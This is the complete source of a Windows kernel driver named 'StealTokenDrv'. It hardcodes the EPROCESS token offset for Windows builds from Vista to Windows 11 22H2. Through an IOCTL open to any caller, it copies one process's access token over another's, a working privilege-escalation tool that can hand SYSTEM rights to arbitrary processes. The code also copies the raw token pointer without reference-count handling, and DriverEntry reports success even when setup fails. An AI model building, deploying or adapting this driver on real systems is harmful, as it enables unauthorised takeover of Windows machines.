#include <ntifs.h>

#define DRIVER_PREFIX "StealTokenDrv: "
#define DEVICE_PATH L"\\Device\\StealToken"
#define SYMLINK_PATH L"\\??\\StealToken"

//
// Global Variables
//
ULONG g_TokenOffset = 0u;

//
// Ioctl code definition
//
#define IOCTL_STEAL_TOKEN CTL_CODE(0x8000, 0x0400, METHOD_BUFFERED, FILE_ANY_ACCESS)

//
// Custom struct definition
//
typedef struct _STEAL_TOKEN_INPUT
{
	ULONG SourcePid;
	ULONG DestinationPid;
} STEAL_TOKEN_INPUT, *PSTEAL_TOKEN_INPUT;

//
// Prototypes
//
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);
NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);

//
// Driver routines
//
extern "C"
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT  DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;
	PDEVICE_OBJECT pDeviceObject = nullptr;

#ifndef _WIN64
	KdPrint((DRIVER_PREFIX "32bit OS is not supported.\n"));
	return STATUS_NOT_SUPPORTED;
#endif

	do
	{
		RTL_OSVERSIONINFOW versionInfo{ 0 };
		UNICODE_STRING devicePath{ 0 };
		UNICODE_STRING symlinkPath{ 0 };
		::RtlInitUnicodeString(&devicePath, DEVICE_PATH);
		::RtlInitUnicodeString(&symlinkPath, SYMLINK_PATH);

		ntstatus = ::RtlGetVersion(&versionInfo);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to get OS version information (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			KdPrint((DRIVER_PREFIX "OS Version - %u.%u.%u\n",
				versionInfo.dwMajorVersion,
				versionInfo.dwMinorVersion,
				versionInfo.dwBuildNumber));

			// _PS_PROTECTION was introduced since Windows 8.1 and Server 2012 R2
			if ((versionInfo.dwMajorVersion == 6))
			{
				if (versionInfo.dwMinorVersion == 0)
				{
					// For Windows Vista
					g_TokenOffset = 0x168u;
				}
				else if (versionInfo.dwMinorVersion == 1)
				{
					// For Windows 7 and Server 2008 R2
					g_TokenOffset = 0x208u;
				}
				else if (versionInfo.dwMinorVersion == 2)
				{
					// For Windows 8 and Server 2012
					g_TokenOffset = 0x348u;
				}
				else if (versionInfo.dwMinorVersion == 3)
				{
					// For Windows 8.1 and Server 2012 R2
					g_TokenOffset = 0x348u;
				}
			}
			else if ((versionInfo.dwMajorVersion == 10) && (versionInfo.dwMinorVersion == 0))
			{
				if (versionInfo.dwBuildNumber == 10240)
				{
					// For Windows 10 1507
					g_TokenOffset = 0x358u;
				}
				else if (versionInfo.dwBuildNumber == 10586)
				{
					// For Windows 10 1511
					g_TokenOffset = 0x358u;
				}
				else if (versionInfo.dwBuildNumber == 14393)
				{
					// For Windows 10 1607
					g_TokenOffset = 0x358u;
				}
				else if (versionInfo.dwBuildNumber == 15063)
				{
					// For Windows 10 1703
					g_TokenOffset = 0x358u;
				}
				else if (versionInfo.dwBuildNumber == 16299)
				{
					// For Windows 10 1709
					g_TokenOffset = 0x358u;
				}
				else if (versionInfo.dwBuildNumber == 17134)
				{
					// For Windows 10 1803
					g_TokenOffset = 0x358u;
				}
				else if (versionInfo.dwBuildNumber == 17763)
				{
					// For Windows 10 1809
					g_TokenOffset = 0x358u;
				}
				else if (versionInfo.dwBuildNumber == 18362)
				{
					// For Windows 10 1903
					g_TokenOffset = 0x360u;
				}
				else if (versionInfo.dwBuildNumber == 18363)
				{
					// For Windows 10 1909
					g_TokenOffset = 0x360u;
				}
				else if (versionInfo.dwBuildNumber == 19041)
				{
					// For Windows 10 2004
					g_TokenOffset = 0x4B8u;
				}
				else if (versionInfo.dwBuildNumber == 19042)
				{
					// For Windows 10 20H2
					g_TokenOffset = 0x4B8u;
				}
				else if (versionInfo.dwBuildNumber == 19043)
				{
					// For Windows 10 21H1
					g_TokenOffset = 0x4B8u;
				}
				else if (versionInfo.dwBuildNumber == 19044)
				{
					// For Windows 10 21H2
					g_TokenOffset = 0x4B8u;
				}
				else if (versionInfo.dwBuildNumber == 19045)
				{
					// For Windows 10 22H2
					g_TokenOffset = 0x4B8u;
				}
				else if (versionInfo.dwBuildNumber == 22000)
				{
					// For Windows 11 21H2
					g_TokenOffset = 0x4B8u;
				}
				else if (versionInfo.dwBuildNumber == 22621)
				{
					// For Windows 11 22H2
					g_TokenOffset = 0x4B8u;
				}
				else
				{
					ntstatus = STATUS_NOT_SUPPORTED;
					KdPrint((DRIVER_PREFIX "Unsupported OS version is detected.\n"));
					break;
				}
			}
			else
			{
				// I don't care about ancient OS
				ntstatus = STATUS_NOT_SUPPORTED;
				KdPrint((DRIVER_PREFIX "Unsupported OS version is detected.\n"));
				break;
			}
		}

		ntstatus = ::IoCreateDevice(
			DriverObject,
			NULL,
			&devicePath,
			FILE_DEVICE_UNKNOWN,
			NULL,
			FALSE,
			&pDeviceObject);

		if (!NT_SUCCESS(ntstatus))
		{
			pDeviceObject = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to create device (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		ntstatus = ::IoCreateSymbolicLink(&symlinkPath, &devicePath);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to create symbolic link (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		DriverObject->DriverUnload = DriverUnload;
		DriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;

		KdPrint((DRIVER_PREFIX "Driver is loaded successfully.\n"));
	} while (false);

	if (!NT_SUCCESS(ntstatus) && (pDeviceObject != nullptr))
		::IoDeleteDevice(pDeviceObject);

	return false;
}


void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symlinkPath{ 0 };
	::RtlInitUnicodeString(&symlinkPath, SYMLINK_PATH);
	::IoDeleteSymbolicLink(&symlinkPath);
	::IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint((DRIVER_PREFIX "Driver is unloaded.\n"));
}


NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_SUCCESS;
	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = 0u;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}


NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST;
	ULONG_PTR info = NULL;
	PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp);
	auto& dic = irpSp->Parameters.DeviceIoControl;

	switch (dic.IoControlCode)
	{
	case IOCTL_STEAL_TOKEN:
		if (dic.InputBufferLength < sizeof(STEAL_TOKEN_INPUT))
		{
			ntstatus = STATUS_BUFFER_TOO_SMALL;
			KdPrint((DRIVER_PREFIX "Input buffer is too small.\n"));
			break;
		}

		auto pInput = (PSTEAL_TOKEN_INPUT)Irp->AssociatedIrp.SystemBuffer;
		PEPROCESS pSrcProcess = nullptr;
		PEPROCESS pDstProcess = nullptr;

		ntstatus = ::PsLookupProcessByProcessId(ULongToHandle(pInput->SourcePid), &pSrcProcess);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to PsLookupProcessByProcessId() for source Process (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			KdPrint((DRIVER_PREFIX "nt!_EPROCESS for PID %u is at 0x%p.\n", pInput->SourcePid, pSrcProcess));
		}

		ntstatus = ::PsLookupProcessByProcessId(ULongToHandle(pInput->DestinationPid), &pDstProcess);

		if (!NT_SUCCESS(ntstatus))
		{
			ObDereferenceObject(pSrcProcess);
			KdPrint((DRIVER_PREFIX "Failed to PsLookupProcessByProcessId() for destination Process (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			KdPrint((DRIVER_PREFIX "nt!_EPROCESS for PID %u is at 0x%p.\n", pInput->DestinationPid, pDstProcess));
		}

		auto srcToken = *(ULONG_PTR*)((ULONG_PTR)pSrcProcess + g_TokenOffset);
		auto pDstToken = (ULONG_PTR*)((ULONG_PTR)pDstProcess + g_TokenOffset);
		*pDstToken = srcToken;

		ObDereferenceObject(pDstProcess);
		ObDereferenceObject(pSrcProcess);

		KdPrint((DRIVER_PREFIX "nt!_EPROCESS.Token for PID %u is overwritten as 0x%p.\n", pInput->DestinationPid, (PVOID)srcToken));
	}

	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}